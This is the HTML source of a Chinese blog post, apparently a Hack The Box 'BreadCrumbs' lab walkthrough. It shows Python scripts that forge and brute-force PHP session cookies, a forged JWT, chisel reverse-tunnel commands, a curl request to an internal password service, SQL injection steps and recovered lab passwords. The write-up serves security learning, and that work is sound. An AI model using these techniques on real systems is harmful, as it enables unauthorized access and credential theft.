@@ -1,0 +1,290 @@
+<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>0X036 BreadCrumbs | 养猪日记</title>
+<meta name=keywords content><meta name=description content='端口扫描
+
+
+
+
+
+
+
+
+获取立足点
+值得注意的服务：ssh\http\smb\mysql
+smb：
+
+
+http:
+看起来是个搜索框，可能是sql注入？
+
+
+fuzz好像没有：
+
+
+目录扫描，发现登录框：
+
+
+发现很多用户名：
+
+
+似乎是存放cookie的地方：
+
+
+同时发现，疑似文件包含：
+
+
+根据报错，看样子是有了：
+
+
+成功读取cookie.php:
+
+
+查看login.php的源码：
+
+
+似乎authController.php才是负责身份控制的：
+
+
+发现数据文件：
+
+
+发现账号密码：
+
+
+但是不允许登录：
+
+
+看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：
+
+
+读取它：
+简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：
+
+
+返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：
+这里面只需要提供账号名，我们就可以伪造了：
+
+
+结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：
+
+
+代码如下：
+import hashlib
+import random
+
+def makesession(username):
+    max_index = len(username) - 1
+    seed = random.randint(0, max_index)
+    key = "s4lTy_stR1nG_" + username[seed] + "(!528./9890"
+    session_cookie = username + hashlib.md5(key.encode()).hexdigest()
+
+    return session_cookie
+
+# 测试示例
+username = "paul"
+session_cookie = makesession(username)
+print("Generated Session Cookie:", session_cookie)
+
+'><meta name=author content="养猪日记"><link rel=canonical href=https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/><link crossorigin=anonymous href=/assets/css/stylesheet.54405a410796490bc874ab6181fac9b675753cc2b91375d8f882566459eca428.css integrity="sha256-VEBaQQeWSQvIdKthgfrJtnV1PMK5E3XY+IJWZFnspCg=" rel="preload stylesheet" as=style><link rel=icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=16x16 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=icon type=image/png sizes=32x32 href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=apple-touch-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><link rel=mask-icon href=https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:title" content="0X036 BreadCrumbs"><meta property="og:description" content='端口扫描
+
+
+
+
+
+
+
+
+获取立足点
+值得注意的服务：ssh\http\smb\mysql
+smb：
+
+
+http:
+看起来是个搜索框，可能是sql注入？
+
+
+fuzz好像没有：
+
+
+目录扫描，发现登录框：
+
+
+发现很多用户名：
+
+
+似乎是存放cookie的地方：
+
+
+同时发现，疑似文件包含：
+
+
+根据报错，看样子是有了：
+
+
+成功读取cookie.php:
+
+
+查看login.php的源码：
+
+
+似乎authController.php才是负责身份控制的：
+
+
+发现数据文件：
+
+
+发现账号密码：
+
+
+但是不允许登录：
+
+
+看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：
+
+
+读取它：
+简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：
+
+
+返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：
+这里面只需要提供账号名，我们就可以伪造了：
+
+
+结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：
+
+
+代码如下：
+import hashlib
+import random
+
+def makesession(username):
+    max_index = len(username) - 1
+    seed = random.randint(0, max_index)
+    key = "s4lTy_stR1nG_" + username[seed] + "(!528./9890"
+    session_cookie = username + hashlib.md5(key.encode()).hexdigest()
+
+    return session_cookie
+
+# 测试示例
+username = "paul"
+session_cookie = makesession(username)
+print("Generated Session Cookie:", session_cookie)
+
+'><meta property="og:type" content="article"><meta property="og:url" content="https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/"><meta property="og:image" content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2024-10-11T14:25:59+08:00"><meta property="article:modified_time" content="2024-10-11T14:25:59+08:00"><meta property="og:site_name" content="养猪日记"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="0X036 BreadCrumbs"><meta name=twitter:description content='端口扫描
+
+
+
+
+
+
+
+
+获取立足点
+值得注意的服务：ssh\http\smb\mysql
+smb：
+
+
+http:
+看起来是个搜索框，可能是sql注入？
+
+
+fuzz好像没有：
+
+
+目录扫描，发现登录框：
+
+
+发现很多用户名：
+
+
+似乎是存放cookie的地方：
+
+
+同时发现，疑似文件包含：
+
+
+根据报错，看样子是有了：
+
+
+成功读取cookie.php:
+
+
+查看login.php的源码：
+
+
+似乎authController.php才是负责身份控制的：
+
+
+发现数据文件：
+
+
+发现账号密码：
+
+
+但是不允许登录：
+
+
+看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：
+
+
+读取它：
+简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：
+
+
+返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：
+这里面只需要提供账号名，我们就可以伪造了：
+
+
+结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：
+
+
+代码如下：
+import hashlib
+import random
+
+def makesession(username):
+    max_index = len(username) - 1
+    seed = random.randint(0, max_index)
+    key = "s4lTy_stR1nG_" + username[seed] + "(!528./9890"
+    session_cookie = username + hashlib.md5(key.encode()).hexdigest()
+
+    return session_cookie
+
+# 测试示例
+username = "paul"
+session_cookie = makesession(username)
+print("Generated Session Cookie:", session_cookie)
+
+'><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://yangzhuzai.github.io/posts/"},{"@type":"ListItem","position":2,"name":"0X036 BreadCrumbs","item":"https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"0X036 BreadCrumbs","name":"0X036 BreadCrumbs","description":"端口扫描 获取立足点 值得注意的服务：ssh\\http\\smb\\mysql\nsmb：\nhttp:\n看起来是个搜索框，可能是sql注入？\nfuzz好像没有：\n目录扫描，发现登录框：\n发现很多用户名：\n似乎是存放cookie的地方：\n同时发现，疑似文件包含：\n根据报错，看样子是有了：\n成功读取cookie.php:\n查看login.php的源码：\n似乎authController.php才是负责身份控制的：\n发现数据文件：\n发现账号密码：\n但是不允许登录：\n看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：\n读取它：\n简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：\n返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：\n这里面只需要提供账号名，我们就可以伪造了：\n结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：\n代码如下：\nimport hashlib\rimport random\rdef makesession(username):\rmax_index = len(username) - 1\rseed = random.randint(0, max_index)\rkey = \u0026#34;s4lTy_stR1nG_\u0026#34; + username[seed] + \u0026#34;(!528./9890\u0026#34;\rsession_cookie = username + hashlib.md5(key.encode()).hexdigest()\rreturn session_cookie\r# 测试示例\rusername = \u0026#34;paul\u0026#34;\rsession_cookie = makesession(username)\rprint(\u0026#34;Generated Session Cookie:\u0026#34;, session_cookie) ","keywords":[],"articleBody":"端口扫描 获取立足点 值得注意的服务：ssh\\http\\smb\\mysql\nsmb：\nhttp:\n看起来是个搜索框，可能是sql注入？\nfuzz好像没有：\n目录扫描，发现登录框：\n发现很多用户名：\n似乎是存放cookie的地方：\n同时发现，疑似文件包含：\n根据报错，看样子是有了：\n成功读取cookie.php:\n查看login.php的源码：\n似乎authController.php才是负责身份控制的：\n发现数据文件：\n发现账号密码：\n但是不允许登录：\n看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：\n读取它：\n简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：\n返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：\n这里面只需要提供账号名，我们就可以伪造了：\n结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：\n代码如下：\nimport hashlib\rimport random\rdef makesession(username):\rmax_index = len(username) - 1\rseed = random.randint(0, max_index)\rkey = \"s4lTy_stR1nG_\" + username[seed] + \"(!528./9890\"\rsession_cookie = username + hashlib.md5(key.encode()).hexdigest()\rreturn session_cookie\r# 测试示例\rusername = \"paul\"\rsession_cookie = makesession(username)\rprint(\"Generated Session Cookie:\", session_cookie) 生成是生成了，但是无法操作成功：\n换成别人的成功了：\nfrom requests import get\rfrom hashlib import md5\rusername = \"paul\"\rfor i in username:\rkey = \"s4lTy_stR1nG_\" + i + \"(!528./9890\"\rsessid = username + md5(key.encode()).hexdigest()\rcookie = { \"PHPSESSID\" : sessid }\rresp = get(\"http://10.10.10.228/portal/php/files.php\", cookies=cookie,\rallow_redirects=False)\rif resp.status_code != 302:\rprint(f\"Valid session ID: {sessid}\") 替换成功后就成功看到了文件管理功能：\n但是提示权限不足：\n看来是之前就看到了的jwt的问题了，但是jwt的key，我们是可以看到的，就可以伪造：\n6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e\n伪造出来为：\neyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU\n看样子是哪里报错了？\n好像是有拦截：\nsmbserver好像失败了：\n那就nishang powershell：\n妈的，服了，还有检测，拦截了\n提权 这里的思路，大概如下：\n1、登录mysql\n2、信息收集\n先看第一个把：\n这个功能要实现，需要端口转发：\nkali执行：\n./chisel server -p 6666 –reverse\nwindows执行：\n./chisel.exe client -v 10.10.16.5:6666 R:0.0.0.0:1234:127.0.0.1:1234\n这样，windows的3306就映射到了kali的8888端口：\n发现密码hash：\n但是爆破不出来：\n呐只能接着看了：\n最后在这里发现密码：\n通过ssh直接登录：\n上winpeass:\n好像不给运行：\n其实web是有权限下载和运行的，但是之前看了一眼systeminfo，感觉也没那么容易，继续信息收集把，刚刚的桌面上有一个文件：\n有一些有趣的信息：\n未授权？\n密码管理？\nMicrosoft Store Sticky Notes是便签，他说在进行中，网上进行搜索，发现可以恢复：\nhttps://blog.csdn.net/sinat_40801052/article/details/123448412\n把文件传输到kali:\n双击打开即可：\ndevelopment: fN3)sN5Ee@g\n登录成功：\n发现信息：\n好像是个解密的程序：\n应该是可以获得administrator的密码：\n但是得逆向，通过strings的信息：\nRequesting decryption key from cloud…\nAccount: Administrator\nhttp://passmanager.htb:1234/index.php\nmethod=select\u0026username=administrator\u0026table=passwords\n在主机上查看也可以看到1234端口开放\n再次转发出来：\n使用curl模拟发包：\ncurl http://passmanager.htb:1234/index.php -d ‘method=select\u0026username=administrator\u0026table=passwords’\n获得aeskey:k19D193j.\u003c19391(\n那么这里其实很容易想到sql注入，其实也是web页面嘛：\n查库名：\n查表名：\n查列名：\n查数据：\n拿到加密的密码和aes_key了，没有偏移量，在线解密即可：\np@ssw0rd!@#$9890./\n总结 这台靶机巨烫手，从开始的web渗透开始，到最后的提权。\nweb渗透的核心是文件包含+代码审计，算是常规考点，但是代码熟悉程度确实是个难点，不是很容易可以写出session的脚本，幸好还有jwt的知识基础，还算容易的绕过。\n随后是文件上传，上传需要进行一些修改，否则会被干，以及反弹shell，nishang的脚本也会被干，需要稍微修改一下代码。\n中间走了弯路，mysql5的hash加密方式，没有爆出来，随后是信息收集，成功获得第一个合法用户密码。\n桌面的工作进程文件，提示存在微软便签，里面存放了明文密码，但是已经被删除，后面通过查询资料，恢复密码，kali可以直接解析，查看即可，获得第二个合法用户密码。\n最后是C盘目录下的非常规目录，找到一个Linux程序，通过strings简单的逆向，可以发现一个web服务，但是仅在127.0.0.1地址开放，需要进行端口转发，通过转发出来，发现该服务是给程序来进行aes_key查询的，通过该方式有很明显的查询痕迹，通过sql注入，成功获取到了aes加密的密码，通过aes_key来解密该密码，即可获得administrator的密码。\n总体来说，这个靶机考点很多，包括：文件包含、代码审计、端口转发、简单免杀绕过、简单逆向、JWT、SQL注入、AES加密算法，一定的脚本编写能力\n","wordCount":"203","inLanguage":"en","image":"https://yangzhuzai.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-10-11T14:25:59+08:00","dateModified":"2024-10-11T14:25:59+08:00","author":{"@type":"Person","name":"养猪日记"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://yangzhuzai.github.io/posts/htb/0x036-breadcrumbs/"},"publisher":{"@type":"Organization","name":"养猪日记","logo":{"@type":"ImageObject","url":"https://yangzhuzai.github.io/%3Clink%20/%20abs%20url%3E"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://yangzhuzai.github.io/ accesskey=h title="Home (Alt + H)"><img src=https://yangzhuzai.github.io/apple-touch-icon.png alt aria-label=logo height=35>Home</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://yangzhuzai.github.io/categories/ title=分类><span>分类</span></a></li><li><a href=https://yangzhuzai.github.io/search/ title=搜索><span>搜索</span></a></li><li><a href=https://github.com/yangzhuzai title=Github><span>Github</span>&nbsp;<svg fill="none" shape-rendering="geometricPrecision" stroke="currentcolor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://yangzhuzai.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://yangzhuzai.github.io/posts/>Posts</a></div><h1 class="post-title entry-hint-parent">0X036 BreadCrumbs</h1><div class=post-meta><span title='2024-10-11 14:25:59 +0800 CST'>October 11, 2024</span>&nbsp;·&nbsp;1 min&nbsp;·&nbsp;203 words&nbsp;·&nbsp;养猪日记</div></header><div class=toc><details open><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents></nav></div></details></div><div class=post-content><h1 id=端口扫描>端口扫描<a hidden class=anchor aria-hidden=true href=#端口扫描>#</a></h1><p><img loading=lazy src=/htb_img/WEBRESOURCE70be77fb5ef93b8149102fb00a072d05image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCEe8715c473c00666e0051e4bfffdde548image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCE29b677e2297d8725770835b3ff84dbf4image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCEf06af7d090a1110fa2f7e891703eac51image.png alt></p><h1 id=获取立足点>获取立足点<a hidden class=anchor aria-hidden=true href=#获取立足点>#</a></h1><p>值得注意的服务：ssh\http\smb\mysql</p><p>smb：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE577cd4ade8a9a13d84ae8618db0b8d31image.png alt></p><p>http:</p><p>看起来是个搜索框，可能是sql注入？</p><p><img loading=lazy src=/htb_img/WEBRESOURCEc5ccae5df7ad67cbdbab90c92ab5d5c9image.png alt></p><p>fuzz好像没有：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEdc4a1d68693754c002aed4f20f59380eimage.png alt></p><p>目录扫描，发现登录框：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE88a7af724c1f43258f48b344870d803cimage.png alt></p><p>发现很多用户名：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE611c4eb350390e4fbe8373abe6846b4cimage.png alt></p><p>似乎是存放cookie的地方：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE79915e476c56fdc93a82e5f7e8c588b7image.png alt></p><p>同时发现，疑似文件包含：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEb358716131321cf3f726119aac887f51image.png alt></p><p>根据报错，看样子是有了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE4c50303b32179b578469e85d451c9bffimage.png alt></p><p>成功读取cookie.php:</p><p><img loading=lazy src=/htb_img/WEBRESOURCE7bd0675c4fd79d436654812ca19e2971image.png alt></p><p>查看login.php的源码：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEe2d9dc38b25f889b59062562bab56330image.png alt></p><p>似乎authController.php才是负责身份控制的：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE378001e303caa274ed5fed50c7783e12image.png alt></p><p>发现数据文件：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE2903756de18100cc7ab83d37d08408bdimage.png alt></p><p>发现账号密码：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE2858bb6f9846a0f08a70ca842e07602dimage.png alt></p><p>但是不允许登录：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE75f311313cc9cf369f8e48733673959bimage.png alt></p><p>看来得代码审计了，目前的用户为cxk1，在登录后台有个我们感兴趣的功能，叫做文件管理：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE4122ba0229a6bb89cb50f80c35c0c010image.png alt></p><p>读取它：</p><p>简单解读，可以发现，这个页面需要用户名为paul的用户才可以访问：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE4d23778e62cf8f06a5217cbe1a974503image.png alt></p><p>返回认证相关功能的代码，我们可以伪造，也就是cookie.php的内容：</p><p>这里面只需要提供账号名，我们就可以伪造了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE910293850c731e21055e0e151283ddb6image.png alt></p><p>结合上面的文件管理功能，我们可以伪造paul用户的身份凭证：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE17b9646a16d87a4a2c5ca7a89b2a938fimage.png alt></p><p>代码如下：</p><pre tabindex=0><code>import hashlib
+import random
+
+def makesession(username):
+    max_index = len(username) - 1
+    seed = random.randint(0, max_index)
+    key = &#34;s4lTy_stR1nG_&#34; + username[seed] + &#34;(!528./9890&#34;
+    session_cookie = username + hashlib.md5(key.encode()).hexdigest()
+
+    return session_cookie
+
+# 测试示例
+username = &#34;paul&#34;
+session_cookie = makesession(username)
+print(&#34;Generated Session Cookie:&#34;, session_cookie)
+</code></pre><p><img loading=lazy src=/htb_img/WEBRESOURCE7b9afb35c9b08cf526a1edc1e62bc361image.png alt></p><p>生成是生成了，但是无法操作成功：</p><p>换成别人的成功了：</p><pre tabindex=0><code>from requests import get
+from hashlib import md5
+
+username = &#34;paul&#34;
+
+for i in username:
+   key = &#34;s4lTy_stR1nG_&#34; + i + &#34;(!528./9890&#34;
+   sessid = username + md5(key.encode()).hexdigest()
+   cookie = { &#34;PHPSESSID&#34; : sessid }
+   resp = get(&#34;http://10.10.10.228/portal/php/files.php&#34;, cookies=cookie,
+allow_redirects=False)
+   if resp.status_code != 302:
+      print(f&#34;Valid session ID: {sessid}&#34;)
+</code></pre><p>替换成功后就成功看到了文件管理功能：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE359a8464b0c61ba8e6259ce047288941image.png alt></p><p>但是提示权限不足：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE6c040c485c6a8ec52c1e26472a8abfb3image.png alt></p><p>看来是之前就看到了的jwt的问题了，但是jwt的key，我们是可以看到的，就可以伪造：</p><p>6cb9c1a2786a483ca5e44571dcc5f3bfa298593a6376ad92185c3258acd5591e</p><p><img loading=lazy src=/htb_img/WEBRESOURCE4505b48f08482ce5257c0eedd8d3a7e5image.png alt></p><p>伪造出来为：</p><p>eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJkYXRhIjp7InVzZXJuYW1lIjoicGF1bCJ9fQ.7pc5S1P76YsrWhi_gu23bzYLYWxqORkr0WtEz_IUtCU</p><p>看样子是哪里报错了？</p><p><img loading=lazy src=/htb_img/WEBRESOURCEac896b1cf79c8284c566c8177d96d3c5image.png alt></p><p>好像是有拦截：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE7609f31168f7cf8a6b60ad5ce23ffc51image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCEf5dd9be2220e2ac0b4d5ab7d3541b870image.png alt></p><p>smbserver好像失败了：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE4e5840e3c3f693efbf2d81ed2613ce4bimage.png alt></p><p>那就nishang powershell：</p><p>妈的，服了，还有检测，拦截了</p><p><img loading=lazy src=/htb_img/WEBRESOURCE48110175f2f21ca900e8cce7ce0a791cimage.png alt></p><h1 id=提权>提权<a hidden class=anchor aria-hidden=true href=#提权>#</a></h1><p>这里的思路，大概如下：</p><p>1、登录mysql</p><p>2、信息收集</p><p>先看第一个把：</p><p>这个功能要实现，需要端口转发：</p><p>kali执行：</p><p>./chisel server -p 6666 &ndash;reverse</p><p><img loading=lazy src=/htb_img/WEBRESOURCE9b85a25eca3841563e2ea4965ca28323image.png alt></p><p>windows执行：</p><p>./chisel.exe client -v 10.10.16.5:6666 R:0.0.0.0:1234:127.0.0.1:1234</p><p><img loading=lazy src=/htb_img/WEBRESOURCE8a30e52381857804b48c370dc10ce25eimage.png alt></p><p>这样，windows的3306就映射到了kali的8888端口：</p><p>发现密码hash：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE74860ea6e9c101153538096301935712image.png alt></p><p>但是爆破不出来：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE37f3517fb2b12c259a005d66d2a2556aimage.png alt></p><p>呐只能接着看了：</p><p>最后在这里发现密码：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE187b034fa43eab81c28555bb8262caa1image.png alt></p><p>通过ssh直接登录：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEb206d7a490d1e6fd4bc6ec8ec4660c86image.png alt></p><p>上winpeass:</p><p>好像不给运行：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEdf01a2a1eb828d1c1065c972d5d11994image.png alt></p><p>其实web是有权限下载和运行的，但是之前看了一眼systeminfo，感觉也没那么容易，继续信息收集把，刚刚的桌面上有一个文件：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE2da7d9697fb82d9672d663082f38a5d3image.png alt></p><p>有一些有趣的信息：</p><p>未授权？</p><p>密码管理？</p><p><img loading=lazy src=/htb_img/WEBRESOURCEecf6654f884eb7af1fa296030d30e58dimage.png alt></p><p>Microsoft Store Sticky Notes是便签，他说在进行中，网上进行搜索，发现可以恢复：</p><p><a href=https://blog.csdn.net/sinat_40801052/article/details/123448412>https://blog.csdn.net/sinat_40801052/article/details/123448412</a></p><p><img loading=lazy src=/htb_img/WEBRESOURCEf242f75cc566c25718112a64a681addeimage.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCEf3963a476e305c3443ce453012e7cdfcimage.png alt></p><p>把文件传输到kali:</p><p><img loading=lazy src=/htb_img/WEBRESOURCEa33e3ed4e66d5a909af55a1fc071a986image.png alt></p><p>双击打开即可：</p><p>development: fN3)sN5Ee@g</p><p><img loading=lazy src=/htb_img/WEBRESOURCE9330a34bc293fb5d214f9b8fa7580160image.png alt></p><p>登录成功：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEe762a9fdca8c9bf53e36d2c0d3f27a41image.png alt></p><p>发现信息：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEba449ad73684adfc9b61bdadd98012b1image.png alt></p><p>好像是个解密的程序：</p><p><img loading=lazy src=/htb_img/WEBRESOURCEdd3b7cf2d7f0d1f20f72c41fed9ed311image.png alt></p><p>应该是可以获得administrator的密码：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE768a802cdf7380308e7c2ce3a974ce2fimage.png alt></p><p>但是得逆向，通过strings的信息：</p><p>Requesting decryption key from cloud&mldr;</p><p>Account: Administrator</p><p><a href=http://passmanager.htb:1234/index.php>http://passmanager.htb:1234/index.php</a></p><p>method=select&amp;username=administrator&amp;table=passwords</p><p>在主机上查看也可以看到1234端口开放</p><p><img loading=lazy src=/htb_img/WEBRESOURCEd0ee4449599fcba0021079f68cb38c72image.png alt></p><p>再次转发出来：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE3b3885fa9a38281a8eb50e2a9b00d8fbimage.png alt></p><p>使用curl模拟发包：</p><p>curl <a href=http://passmanager.htb:1234/index.php>http://passmanager.htb:1234/index.php</a> -d &lsquo;method=select&amp;username=administrator&amp;table=passwords&rsquo;</p><p>获得aeskey:k19D193j.&lt;19391(</p><p><img loading=lazy src=/htb_img/WEBRESOURCEf37794c74d89c31f07bd7a19c21a1048image.png alt></p><p>那么这里其实很容易想到sql注入，其实也是web页面嘛：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE284ce5fc23c7757c3583d48be1179b4dimage.png alt></p><p>查库名：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE21de18fb1cf3c458fc9ef1315eb24ecfimage.png alt></p><p>查表名：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE633a165031ab35661336c286dd9d9cffimage.png alt></p><p>查列名：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE7a9cc9cd5447f45e24a1456b01be2314image.png alt></p><p>查数据：</p><p><img loading=lazy src=/htb_img/WEBRESOURCE7f169cef0d1f3f7ae4d30c5999c89521image.png alt></p><p>拿到加密的密码和aes_key了，没有偏移量，在线解密即可：</p><p>p@ssw0rd!@#$9890./</p><p><img loading=lazy src=/htb_img/WEBRESOURCEdd9a6698c340f65bbc98cbe2581a4674image.png alt></p><p><img loading=lazy src=/htb_img/WEBRESOURCE07e2ebf68fc6cc39aac73979fc27b09fimage.png alt></p><h1 id=总结>总结<a hidden class=anchor aria-hidden=true href=#总结>#</a></h1><p>这台靶机巨烫手，从开始的web渗透开始，到最后的提权。</p><p>web渗透的核心是文件包含+代码审计，算是常规考点，但是代码熟悉程度确实是个难点，不是很容易可以写出session的脚本，幸好还有jwt的知识基础，还算容易的绕过。</p><p>随后是文件上传，上传需要进行一些修改，否则会被干，以及反弹shell，nishang的脚本也会被干，需要稍微修改一下代码。</p><p>中间走了弯路，mysql5的hash加密方式，没有爆出来，随后是信息收集，成功获得第一个合法用户密码。</p><p>桌面的工作进程文件，提示存在微软便签，里面存放了明文密码，但是已经被删除，后面通过查询资料，恢复密码，kali可以直接解析，查看即可，获得第二个合法用户密码。</p><p>最后是C盘目录下的非常规目录，找到一个Linux程序，通过strings简单的逆向，可以发现一个web服务，但是仅在127.0.0.1地址开放，需要进行端口转发，通过转发出来，发现该服务是给程序来进行aes_key查询的，通过该方式有很明显的查询痕迹，通过sql注入，成功获取到了aes加密的密码，通过aes_key来解密该密码，即可获得administrator的密码。</p><p>总体来说，这个靶机考点很多，包括：文件包含、代码审计、端口转发、简单免杀绕过、简单逆向、JWT、SQL注入、AES加密算法，一定的脚本编写能力</p></div><footer class=post-footer><ul class=post-tags></ul><nav class=paginav><a class=prev href=https://yangzhuzai.github.io/posts/vulnhub/0x035-sunset-decoy/><span class=title>« Prev</span><br><span>0x035 sunset decoy</span>
+</a><a class=next href=https://yangzhuzai.github.io/posts/vulnhub/0x036-sunset-midnight-/><span class=title>Next »</span><br><span>0x036 sunset midnight</span></a></nav></footer></article></main><footer class=footer><span>&copy; 2024 <a href=https://yangzhuzai.github.io/>养猪日记</a></span> ·
+<span>Powered by
+<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
+        <a href=https://github.com/adityatelange/hugo-PaperMod/ rel=noopener target=_blank>PaperMod</a></span></footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
